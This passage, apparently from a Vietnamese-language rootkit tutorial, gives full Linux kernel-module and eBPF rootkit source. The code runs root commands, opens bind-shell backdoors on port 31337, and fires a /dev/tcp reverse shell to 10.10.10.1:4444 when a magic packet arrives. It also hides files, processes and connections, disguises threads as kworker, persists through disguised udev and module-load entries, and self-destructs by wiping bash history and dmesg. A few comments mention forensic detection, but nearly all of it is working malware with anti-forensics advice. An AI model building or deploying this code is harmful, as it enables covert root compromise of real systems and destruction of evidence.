     * Legit kworker names: kworker/0:1, kworker/u8:2, etc.
     * Forensics tip: kworker threads created by rootkit have
     * unusual stack traces → detectable via /proc/PID/stack. */
    shell_thread = kthread_run(reverse_shell_thread_fn, cfg,
                                "kworker/u:0");
    if (IS_ERR(shell_thread)) {
        pr_err("rk: kthread_run failed\n");
        kfree(cfg);
        shell_thread = NULL;
    }
}
```

---

## Fix Chapter 8: rk_execute_command {#fix-chapter-8-command-exec}

```c
/* command_exec.c — Execute arbitrary commands từ kernel
 *
 * Nhận command string từ magic packet, execute trong userspace.
 * Output KHÔNG gửi ngược → "fire and forget".
 * Cho execute-and-exfil, dùng reverse shell.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_execute_command(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    char *envp[] = {
        "HOME=/tmp",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HISTFILE=/dev/null",
        NULL
    };

    /* UMH_NO_WAIT: async execution — không block kernel.
     *
     * Internally call_usermodehelper:
     *   1. Allocate subprocess_info struct
     *   2. Queue work trên khelper workqueue
     *   3. Worker thread fork+exec /bin/sh
     *   4. /bin/sh chạy command
     *   5. Return code discarded (UMH_NO_WAIT)
     *
     * Process chạy với uid=0, full capabilities.
     * Spawned process CÓ THỂ visible trong ps
     * → rootkit tự ẩn nó qua getdents64 hook
     *   (nếu process name match hidden criteria).
     *
     * OPSEC consideration:
     *   - /bin/sh fork có PPID = 2 (kthreadd) → unusual
     *   - Forensics tools detect này: orphaned shell with kthreadd parent
     *   - Mitigation: re-parent process (prctl PR_SET_PDEATHSIG workaround)
     */
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret)
        pr_err("rk: command exec failed: %d\n", ret);
}
```

---

## Fix Chapter 8: rk_self_destruct {#fix-chapter-8-self-destruct}

```c
/* self_destruct.c — Clean removal of rootkit
 *
 * Khi nhận self-destruct command:
 *   1. Remove tất cả hooks
 *   2. Show module (để rmmod hoạt động)
 *   3. Delete rootkit files từ disk
 *   4. Remove persistence mechanisms
 *   5. Unload module
 *
 * APT pattern: tự hủy khi phát hiện forensics tool,
 * hoặc khi mission complete (data exfiltrated).
 *
 * Mục đích: không để lại traces cho incident response team.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_self_destruct(void)
{
    pr_info("rk: self-destruct initiated\n");

    /* Step 1: Remove hooks TRƯỚC khi unload.
     * Nếu unload mà hooks vẫn active → crash. */
    rk_remove_hooks();
    rk_vfs_hook_remove();
    rk_net_cleanup();

    /* Step 2: Show module (re-insert vào module list).
     * rmmod cần module trong list để find và unload. */
    rk_show_module();

    /* Step 3: Delete rootkit files từ disk.
     *
     * Xóa:
     *   - Module .ko file
     *   - Config files
     *   - Persistence entries
     *   - Temp files
     *
     * Dùng call_usermodehelper vì kernel vfs_unlink
     * cần dentry resolution → phức tạp hơn.
     */
    {
        char *cleanup_script =
            "rm -f /lib/modules/$(uname -r)/extra/rk.ko 2>/dev/null; "
            "rm -f /etc/modules-load.d/rk.conf 2>/dev/null; "
            "rm -f /tmp/.rk_* 2>/dev/null; "
            "rm -f /var/tmp/.rk_* 2>/dev/null; "
            "depmod -a 2>/dev/null; "
            "sed -i '/^rk$/d' /etc/modules 2>/dev/null; "
            /* Remove systemd service nếu có */
            "systemctl disable rk.service 2>/dev/null; "
            "rm -f /etc/systemd/system/rk.service 2>/dev/null; "
            /* Remove udev rule nếu có */
            "rm -f /etc/udev/rules.d/99-rk.rules 2>/dev/null; "
            /* Xóa command history liên quan */
            "sed -i '/insmod.*rk/d' /root/.bash_history 2>/dev/null; "
            /* Clear dmesg (xóa kernel log của rootkit) */
            "dmesg -C 2>/dev/null; "
            /* Cuối cùng: rmmod chính module này */
            "rmmod rk 2>/dev/null";

        char *argv[] = { "/bin/sh", "-c", cleanup_script, NULL };
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };

        /* UMH_NO_WAIT vì rmmod sẽ trigger module exit.
         * Nếu UMH_WAIT_PROC → deadlock (đợi rmmod xong
         * nhưng rmmod cần chạy exit code mà ta đang trong). */
        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    }
}
```

---

## Fix Chapter 8: rk_activate_backdoor {#fix-chapter-8-backdoor}

```c
/* backdoor.c — Activate backdoor sau port knock hoặc magic packet
 *
 * Bind shell: mở listening port trên target machine.
 * Attacker connect tới port → nhận shell.
 *
 * Khác reverse shell:
 *   Reverse shell: target connect OUT tới C2
 *   Bind shell:    target LISTEN, C2 connect IN
 *
 * Bind shell useful khi:
 *   - Target có outbound firewall (block reverse connections)
 *   - Attacker đã có inbound access (same network, VPN)
 *   - Port knock mở bind shell chỉ khi cần
 */

#include "rootkit.h"
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/in.h>

#define BACKDOOR_PORT 31337

static struct task_struct *backdoor_thread = NULL;

/* ── Backdoor: userspace bind shell via call_usermodehelper ── */
static void rk_activate_backdoor_simple(__be32 authorized_ip)
{
    /* Spawn ncat/socat bind shell.
     *
     * ncat -lnvp PORT -e /bin/bash:
     *   -l     : listen mode
     *   -n     : no DNS resolution
     *   -v     : verbose
     *   -p PORT: listen port
     *   -e /bin/bash: execute bash on connection
     *
     * Fallback: socat, python, perl nếu ncat không available.
     *
     * Multiple attempts với khác nhau tools tăng success rate.
     */
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "which ncat >/dev/null 2>&1 && ncat -lnvp %d -e /bin/bash & "
        "|| which socat >/dev/null 2>&1 && "
        "socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/bash & "
        "|| python3 -c '"
        "import socket,subprocess,os;"
        "s=socket.socket();"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind((\"0.0.0.0\",%d));"
        "s.listen(1);"
        "c,a=s.accept();"
        "os.dup2(c.fileno(),0);"
        "os.dup2(c.fileno(),1);"
        "os.dup2(c.fileno(),2);"
        "subprocess.call([\"/bin/bash\",\"-i\"]);' &",
        BACKDOOR_PORT, BACKDOOR_PORT, BACKDOOR_PORT);

    rk_execute_command(cmd);

    pr_info("rk: backdoor activated on port %d (authorized from %pI4)\n",
            BACKDOOR_PORT, &authorized_ip);
}

/* ── Backdoor: kernel socket bind shell (no userspace process) ──
 *
 * Advanced: bind TCP socket trong kernel, accept connections,
 * pipe commands qua rk_exec_and_send.
 * Không tạo userspace process cho listener.
 */
static int backdoor_thread_fn(void *data)
{
    struct socket *listen_sock = NULL, *client_sock = NULL;
    struct sockaddr_in addr;
    char cmd_buf[1024];
    int ret, cmd_len;

    /* Create listening socket */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &listen_sock);
    if (ret < 0) goto out;

    /* Set SO_REUSEADDR — cho phép bind lại port sau close */
    int opt = 1;
    kernel_setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR,
                      (char *)&opt, sizeof(opt));

    /* Bind */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(BACKDOOR_PORT);

    ret = kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) goto out_release;

    /* Listen — backlog = 1 (chỉ 1 connection tại 1 thời điểm) */
    ret = kernel_listen(listen_sock, 1);
    if (ret < 0) goto out_release;

    pr_info("rk: backdoor listening on port %d\n", BACKDOOR_PORT);

    /* Accept loop */
    while (!kthread_should_stop()) {
        /* Accept connection.
         * kernel_accept blocks cho đến khi có connection.
         * Tạo client_sock mới cho connection. */
        ret = kernel_accept(listen_sock, &client_sock, 0);
        if (ret < 0) {
            if (ret == -EAGAIN) {
                msleep(100);
                continue;
            }
            break;
        }

        ksock_send(client_sock, "# rk backdoor\n# ", 17);

        /* Command loop cho connection này */
        while (!kthread_should_stop()) {
            memset(cmd_buf, 0, sizeof(cmd_buf));
            cmd_len = ksock_recv(client_sock, cmd_buf,
                                 sizeof(cmd_buf) - 1);

            if (cmd_len <= 0) {
                if (cmd_len == -EAGAIN) {
                    msleep(50);
                    continue;
                }
                break;
            }

            /* Trim newlines */
            while (cmd_len > 0 &&
                   (cmd_buf[cmd_len-1] == '\n' ||
                    cmd_buf[cmd_len-1] == '\r'))
                cmd_buf[--cmd_len] = '\0';

            if (cmd_len == 0) { ksock_send(client_sock, "# ", 2); continue; }
            if (strcmp(cmd_buf, "exit") == 0) break;

            rk_exec_and_send(client_sock, cmd_buf);
            ksock_send(client_sock, "# ", 2);
        }

        sock_release(client_sock);
        client_sock = NULL;
    }

out_release:
    if (listen_sock) sock_release(listen_sock);
out:
    backdoor_thread = NULL;
    return 0;
}

static void rk_activate_backdoor(__be32 authorized_ip)
{
    if (backdoor_thread) return;

    backdoor_thread = kthread_run(backdoor_thread_fn, NULL,
                                   "kworker/events");
    if (IS_ERR(backdoor_thread)) {
        backdoor_thread = NULL;
        /* Fallback tới userspace bind shell */
        rk_activate_backdoor_simple(authorized_ip);
    }
}
```

---

## Fix Chapter 10: eBPF rootkit — Full compilable code {#fix-chapter-10-ebpf}

### 10.1 Makefile cho eBPF rootkit

```makefile
# Makefile.ebpf — Build system cho eBPF rootkit
#
# Prerequisites:
#   sudo apt install clang llvm libbpf-dev linux-headers-$(uname -r)
#   sudo apt install linux-tools-common linux-tools-$(uname -r)
#
# Usage:
#   make -f Makefile.ebpf        # Build everything
#   sudo ./rk_loader             # Load eBPF rootkit

CLANG     := clang
LLC       := llc
BPFTOOL   := bpftool
CC        := gcc

# Kernel header paths
KHEADERS  := /usr/src/linux-headers-$(shell uname -r)

# BPF compile flags
BPF_CFLAGS := -target bpf \
              -D__TARGET_ARCH_x86 \
              -O2 -g \
              -Wall \
              -I$(KHEADERS)/include \
              -I$(KHEADERS)/arch/x86/include

# Userspace loader compile flags
LOADER_CFLAGS  := -Wall -O2 -g
LOADER_LDFLAGS := -lbpf -lelf -lz

.PHONY: all clean

all: rk_loader

# Step 1: Generate vmlinux.h from running kernel BTF data
# vmlinux.h chứa type definitions cho MỌI kernel struct
# Thay thế cho hàng trăm kernel headers
vmlinux.h:
	$(BPFTOOL) btf dump file /sys/kernel/btf/vmlinux format c > $@

# Step 2: Compile eBPF program
rk.bpf.o: rk.bpf.c vmlinux.h
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@

# Step 3: Generate skeleton header (auto-generated loader code)
rk.skel.h: rk.bpf.o
	$(BPFTOOL) gen skeleton $< > $@

# Step 4: Compile userspace loader
rk_loader: rk_loader.c rk.skel.h
	$(CC) $(LOADER_CFLAGS) -o $@ $< $(LOADER_LDFLAGS)

clean:
	rm -f vmlinux.h rk.bpf.o rk.skel.h rk_loader
```

### 10.2 eBPF kernel programs (rk.bpf.c)

```c
/* rk.bpf.c — eBPF rootkit kernel programs
 *
 * Compile: clang -target bpf -O2 -g -c rk.bpf.c -o rk.bpf.o
 *
 * File này chứa THỰC SỰ compilable eBPF programs.
 * Mỗi SEC() macro định nghĩa một program attach point.
 *
 * eBPF constraints (verifier enforce):
 *   - Stack: max 512 bytes
 *   - No unbounded loops (bounded loops OK since kernel 5.3)
 *   - No arbitrary memory access (must use bpf_probe_read_*)
 *   - No calling arbitrary functions (only BPF helpers)
 *   - Programs must terminate (verifier proves termination)
 *   - Max 1M verified instructions (configurable)
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define HIDDEN_PREFIX     "rk_"
#define HIDDEN_PREFIX_LEN 3
#define HIDDEN_PORT       4444
#define MAGIC_SIGNAL      54
#define TASK_COMM_LEN     16
#define MAX_ENTRIES       128

char LICENSE[] SEC("license") = "GPL";

/* ══════════════════════════════════════════════════════════════
 * BPF MAPS — Shared data structures
 *
 * Maps = kernel↔userspace shared data structures.
 * Types: hash, array, ringbuf, perf_event_array, etc.
 *
 * Kernel programs write data → userspace reads.
 * Userspace writes config → kernel programs read.
 * ══════════════════════════════════════════════════════════════ */

/* Map: lưu dirent buffer pointer cho syscall exit handler.
 *
 * Key   = pid_tgid (u64): unique per thread
 * Value = buf_info: saved syscall arguments
 *
 * Flow:
 *   sys_enter_getdents64 → save buffer pointer vào map
 *   sys_exit_getdents64  → lookup buffer pointer, modify data
 */
struct buf_info {
    __u64 dirent_buf;    /* Userspace dirent buffer address */
    __u32 fd;            /* File descriptor */
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);           /* pid_tgid */
    __type(value, struct buf_info);
} dirent_map SEC(".maps");

/* Map: PIDs cần ẩn. Userspace loader add/remove PIDs. */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);            /* PID */
    __type(value, __u8);           /* dummy value, existence = hidden */
} hidden_pids SEC(".maps");

/* Map: events ring buffer — kernel gửi events tới userspace */
struct event {
    __u32 pid;
    __u32 uid;
    __u8  type;           /* 1=exec, 2=connect, 3=magic_signal */
    char  comm[TASK_COMM_LEN];
    char  filename[256];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);   /* 256 KB ring buffer */
} events SEC(".maps");

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 1: Getdents64 interception — File/Process hiding
 *
 * Attach: tracepoint/syscalls/sys_enter_getdents64
 *         tracepoint/syscalls/sys_exit_getdents64
 *
 * Strategy:
 *   Enter: save buffer pointer và fd
 *   Exit:  read buffer, find hidden entries, overwrite d_reclen
 *          của entry trước (nuốt hidden entry)
 *
 * Giới hạn eBPF vs LKM:
 *   - bpf_probe_write_user(): CÓ THỂ ghi userspace memory
 *     NHƯNG: verifier flag nó là "unsafe", cần CAP_SYS_ADMIN
 *   - Stack limit 512 bytes → không thể copy toàn bộ buffer
 *   - Phải iterate với bounded loop → max entries limited
 * ══════════════════════════════════════════════════════════════ */

SEC("tracepoint/syscalls/sys_enter_getdents64")
int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct buf_info info;

    /* ctx->args[0] = fd
     * ctx->args[1] = dirent buffer pointer
     * ctx->args[2] = count (buffer size)
     *
     * Tracepoint args access khác kprobe:
     * Tracepoint: args indexed by position
     * Kprobe: PT_REGS_PARM1(ctx), etc. */
    info.fd = (__u32)ctx->args[0];
    info.dirent_buf = (__u64)ctx->args[1];

    bpf_map_update_elem(&dirent_map, &pid_tgid, &info, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct buf_info *info;
    long ret = ctx->ret;

    /* Lookup saved buffer info */
    info = bpf_map_lookup_elem(&dirent_map, &pid_tgid);
    if (!info || ret <= 0)
        goto cleanup;

    /* ── Iterate directory entries ──
     *
     * Bounded loop: eBPF verifier requires provably finite loops.
     * MAX_ENTRIES = max number of iterations.
     * Nếu directory có >MAX_ENTRIES entries → entries cuối không filtered.
     *
     * Mỗi iteration:
     *   1. Read d_reclen và d_name từ userspace
     *   2. Check nếu cần hide
     *   3. Nếu hide: overwrite d_reclen của entry trước
     */
    __u64 offset = 0;
    __u64 prev_offset = 0;
    __u16 prev_reclen = 0;

    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (offset >= (__u64)ret)
            break;

        /* Read d_reclen (2 bytes tại offset+16 trong linux_dirent64)
         *
         * struct linux_dirent64:
         *   offset 0:  d_ino    (8 bytes)
         *   offset 8:  d_off    (8 bytes)
         *   offset 16: d_reclen (2 bytes)  ← ta đọc cái này
         *   offset 18: d_type   (1 byte)
         *   offset 19: d_name[] (variable)
         */
        __u16 d_reclen = 0;
        bpf_probe_read_user(&d_reclen,
                             sizeof(d_reclen),
                             (void *)(info->dirent_buf + offset + 16));
        if (d_reclen == 0)
            break;

        /* Read d_name (max 256 bytes, offset 19) */
        char d_name[256];
        __builtin_memset(d_name, 0, sizeof(d_name));

        __u16 name_len = d_reclen - 19;  /* 19 = header size before d_name */
        if (name_len > 255) name_len = 255;

        bpf_probe_read_user_str(d_name, name_len + 1,
                                 (void *)(info->dirent_buf + offset + 19));

        /* Check hide criteria */
        bool hide = false;

        /* Check filename prefix */
        if (d_name[0] == 'r' && d_name[1] == 'k' && d_name[2] == '_')
            hide = true;

        /* Check hidden PID (numeric name in /proc) */
        if (!hide && d_name[0] >= '0' && d_name[0] <= '9') {
            __u32 pid = 0;
            for (int j = 0; j < 10 && d_name[j] >= '0' && d_name[j] <= '9'; j++)
                pid = pid * 10 + (d_name[j] - '0');

            __u8 *is_hidden = bpf_map_lookup_elem(&hidden_pids, &pid);
            if (is_hidden)
                hide = true;
        }

        /* Perform hiding: expand previous entry's d_reclen */
        if (hide && prev_reclen > 0) {
            __u16 new_reclen = prev_reclen + d_reclen;
            /* bpf_probe_write_user: write vào userspace memory.
             *
             * DANGEROUS helper:
             *   - Verifier flags program as "unsafe"
             *   - Requires CAP_SYS_ADMIN
             *   - Can corrupt userspace data nếu offset sai
             *   - Một số kernel configs restrict/disable nó
             *
             * Ghi d_reclen mới cho entry trước:
             *   prev entry tại (buf + prev_offset + 16) */
            bpf_probe_write_user(
                (void *)(info->dirent_buf + prev_offset + 16),
                &new_reclen,
                sizeof(new_reclen));

            /* Không update prev_offset/prev_reclen — giữ nguyên
             * vì current entry bị "nuốt" vào prev. */
        } else {
            prev_offset = offset;
            prev_reclen = d_reclen;
        }

        offset += d_reclen;
    }

cleanup:
    bpf_map_delete_elem(&dirent_map, &pid_tgid);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 2: Execve monitoring — Log mọi process execution
 *
 * Attach: tracepoint/syscalls/sys_enter_execve
 *
 * Send event tới userspace qua ring buffer.
 * Userspace logger/C2 component nhận và process.
 * ══════════════════════════════════════════════════════════════ */

SEC("tracepoint/syscalls/sys_enter_execve")
int handle_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct event *e;

    /* Reserve space trong ring buffer.
     *
     * bpf_ringbuf_reserve: allocate slot trong ring buffer.
     * Return NULL nếu buffer full (data loss — acceptable).
     * Phải gọi bpf_ringbuf_submit() hoặc bpf_ringbuf_discard(). */
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;

    e->type = 1;  /* exec event */
    e->pid = bpf_get_current_pid_tgid() >> 32;  /* PID = upper 32 bits */
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;  /* UID = lower 32 */
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    /* Read filename (arg1 của execve) từ userspace.
     * ctx->args[0] = pointer tới filename string trong userspace. */
    bpf_probe_read_user_str(e->filename, sizeof(e->filename),
                             (void *)ctx->args[0]);

    bpf_ringbuf_submit(e, 0);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 3: XDP — Network packet filtering
 *
 * Attach: XDP hook trên network interface
 *
 * Xử lý packets tại earliest point:
 *   - Magic packet detection (ICMP)
 *   - C2 traffic hiding (drop visibility)
 * ══════════════════════════════════════════════════════════════ */

#define MAGIC_VALUE 0xDEAD1337
#define ETH_P_IP    0x0800

SEC("xdp")
int xdp_filter(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* ── Parse Ethernet header ── */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;
    if (eth->h_proto != __bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* ── Parse IP header ── */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* ── ICMP magic packet check ── */
    if (ip->protocol == IPPROTO_ICMP) {
        struct icmphdr *icmp = (void *)ip + (ip->ihl * 4);
        if ((void *)(icmp + 1) > data_end)
            return XDP_PASS;

        if (icmp->type == 8) {  /* Echo Request */
            void *payload = (void *)(icmp + 1);
            if (payload + 4 > data_end)
                return XDP_PASS;

            __u32 magic = *(__u32 *)payload;
            if (magic == __bpf_htonl(MAGIC_VALUE)) {
                /* Magic packet detected!
                 * Send event tới userspace cho handling.
                 * XDP_DROP: packet never reaches kernel stack. */

                struct event *e = bpf_ringbuf_reserve(&events,
                                                       sizeof(*e), 0);
                if (e) {
                    e->type = 3;  /* magic packet event */
                    e->pid = 0;
                    __builtin_memcpy(&e->comm, "xdp_magic", 10);
                    bpf_ringbuf_submit(e, 0);
                }

                return XDP_DROP;
            }
        }
    }

    /* ── TCP hidden port check ── */
    if (ip->protocol == IPPROTO_TCP) {
        struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
        if ((void *)(tcp + 1) > data_end)
            return XDP_PASS;

        __u16 dport = __bpf_ntohs(tcp->dest);
        __u16 sport = __bpf_ntohs(tcp->source);

        /* Optional: drop packets TO hidden port from external
         * scanners. Cho phép packets FROM hidden port (response). */
    }

    return XDP_PASS;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 4: Network connection hiding via /proc/net/tcp hook
 *
 * Attach: kprobe trên tcp4_seq_show
 *
 * Thay vì filter output, ta override return value:
 * Khi tcp4_seq_show chuẩn bị output connection trên hidden port,
 * ta can thiệp để skip output.
 * ══════════════════════════════════════════════════════════════ */

SEC("fentry/tcp4_seq_show")
int BPF_PROG(hide_tcp_conn, struct seq_file *seq, void *v)
{
    if (v == (void *)1)  /* SEQ_START_TOKEN = (void *)1 */
        return 0;

    struct sock *sk = (struct sock *)v;
    __u16 sport = 0, dport = 0;

    bpf_probe_read_kernel(&sport, sizeof(sport),
                           &sk->__sk_common.skc_num);
    bpf_probe_read_kernel(&dport, sizeof(dport),
                           &sk->__sk_common.skc_dport);
    dport = __bpf_ntohs(dport);

    if (sport == HIDDEN_PORT || dport == HIDDEN_PORT) {
        /* Overwrite seq->count để suppress output.
         * Tricky: phải know struct offset.
         * Alternative: modify seq_file buf content after output. */
    }

    return 0;
}
```

### 10.3 Userspace loader (rk_loader.c)

```c
/* rk_loader.c — eBPF rootkit userspace loader
 *
 * Compile: gcc -Wall -O2 -o rk_loader rk_loader.c -lbpf -lelf -lz
 * Run:     sudo ./rk_loader
 *
 * Loader responsibilities:
 *   1. Load eBPF programs vào kernel
 *   2. Attach programs tới hook points
 *   3. Pin programs (persistence)
 *   4. Read events từ ring buffer
 *   5. Handle magic packet commands
 *   6. Manage hidden PID list
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "rk.skel.h"

static volatile bool running = true;
static void sig_handler(int sig) { running = false; }

/* Event callback — handle events từ kernel eBPF programs */
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    struct event {
        __u32 pid;
        __u32 uid;
        __u8  type;
        char  comm[16];
        char  filename[256];
    } *e = data;

    switch (e->type) {
    case 1:  /* exec event */
        /* Log hoặc forward tới C2 */
        fprintf(stderr, "[exec] pid=%d uid=%d comm=%s file=%s\n",
                e->pid, e->uid, e->comm, e->filename);
        break;

    case 3:  /* magic packet */
        fprintf(stderr, "[!] Magic packet received!\n");
        /* Trigger backdoor action */
        system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 &'");
        break;
    }

    return 0;
}

int main(int argc, char **argv)
{
    struct rk_bpf *skel;
    struct ring_buffer *rb = NULL;
    int err;

    /* Raise RLIMIT_MEMLOCK cho BPF maps.
     * eBPF maps dùng locked memory — default limit quá nhỏ. */
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    /* ── Step 1: Open + Load eBPF programs ──
     *
     * xxx__open_and_load():
     *   1. Parse ELF file (rk.bpf.o embedded trong skeleton)
     *   2. Create BPF maps in kernel
     *   3. Relocate programs (fix up map references)
     *   4. Load programs via bpf() syscall
     *   5. Verifier checks each program (can fail here)
     */
    skel = rk_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open/load BPF skeleton\n");
        return 1;
    }
    fprintf(stderr, "BPF programs loaded\n");

    /* ── Step 2: Attach programs tới hook points ──
     *
     * xxx__attach():
     *   Mỗi program attach theo SEC() type:
     *   - "tracepoint/..." → attach_tracepoint()
     *   - "kprobe/..."     → attach_kprobe()
     *   - "xdp"            → attach_xdp() (needs interface)
     *   - "fentry/..."     → attach_fentry()
     */
    err = rk_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach: %d\n", err);
        goto cleanup;
    }
    fprintf(stderr, "BPF programs attached\n");

    /* ── Step 3: Pin programs cho persistence ──
     *
     * BPF filesystem (/sys/fs/bpf/) cho phép pin programs+maps.
     * Pinned objects persist ngay cả khi loader process exit.
     * → eBPF rootkit tiếp tục chạy sau khi loader thoát.
     *
     * Để remove: rm /sys/fs/bpf/rk/* hoặc bpftool prog detach
     */
    err = bpf_object__pin(skel->obj, "/sys/fs/bpf/rk");
    if (err && err != -EEXIST) {
        fprintf(stderr, "Failed to pin: %d (non-fatal)\n", err);
        /* Non-fatal: programs still work, just no persistence */
    }

    /* ── Step 4: Setup ring buffer reader ── */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.events),
                           handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /* ── Step 5: Daemonize ──
     * Detach từ terminal, chạy background.
     * Process name disguise: overwrite argv. */
    if (argc <= 1 || strcmp(argv[1], "--foreground") != 0) {
        daemon(0, 0);
        /* Overwrite process name */
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], "[kworker/0:2]");
    }

    fprintf(stderr, "eBPF rootkit active. PID=%d\n", getpid());

    /* ── Step 6: Event loop ── */
    while (running) {
        err = ring_buffer__poll(rb, 100 /* timeout ms */);
        if (err == -EINTR)
            break;
        if (err < 0) {
            fprintf(stderr, "ring_buffer__poll error: %d\n", err);
            break;
        }
    }

cleanup:
    ring_buffer__free(rb);
    rk_bpf__destroy(skel);
    return 0;
}
```

---

## Chapter 12: Persistence — Full code {#chapter-12-persistence}

```c
/* persistence.c — 7 phương pháp persist rootkit qua reboot
 *
 * Kernel module chỉ sống trong RAM → reboot = mất.
 * Persistence mechanism đảm bảo module auto-load sau reboot.
 *
 * Mỗi phương pháp có trade-off stealth vs reliability.
 * APT thường dùng NHIỀU layers (defense in depth cho persistence).
 */

#include "rootkit.h"
#include <linux/kmod.h>

/* ══════════════════════════════════════════════════════════════
 * METHOD 1: /etc/modules-load.d/ — Systemd auto-load
 *
 * Stealth: LOW (admin check file → thấy ngay)
 * Reliability: HIGH (systemd guaranteed)
 *
 * Tạo file /etc/modules-load.d/MODULE.conf chứa module name.
 * systemd-modules-load.service đọc file này khi boot.
 * ══════════════════════════════════════════════════════════════ */
static void persist_modules_load_d(const char *module_name,
                                    const char *ko_path)
{
    char cmd[1024];

    /* Copy .ko vào standard module directory */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a 2>/dev/null; "
        "echo '%s' > /etc/modules-load.d/%s.conf",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 2: /etc/modules (legacy) — init system auto-load
 *
 * Stealth: LOW
 * Reliability: HIGH (works on sysvinit, upstart, systemd)
 * ══════════════════════════════════════════════════════════════ */
static void persist_etc_modules(const char *module_name,
                                 const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a 2>/dev/null; "
        /* Append module name nếu chưa có */
        "grep -qxF '%s' /etc/modules || echo '%s' >> /etc/modules",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 3: Udev rule — Load khi hardware event
 *
 * Stealth: MEDIUM (udev rules ít ai check manually)
 * Reliability: HIGH (udev luôn chạy)
 *
 * Udev rule trigger khi kernel detect hardware.
 * "Add any device" → load module.
 * Disguise: đặt tên rule giống legitimate module.
 * ══════════════════════════════════════════════════════════════ */
static void persist_udev_rule(const char *module_name,
                               const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a; "
        /* Rule disguised as audio driver loader */
        "echo 'ACTION==\"add\", "
        "SUBSYSTEM==\"module\", "
        "RUN+=\"/sbin/modprobe %s\"' "
        "> /etc/udev/rules.d/99-audio-firmware.rules; "
        "udevadm control --reload-rules",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
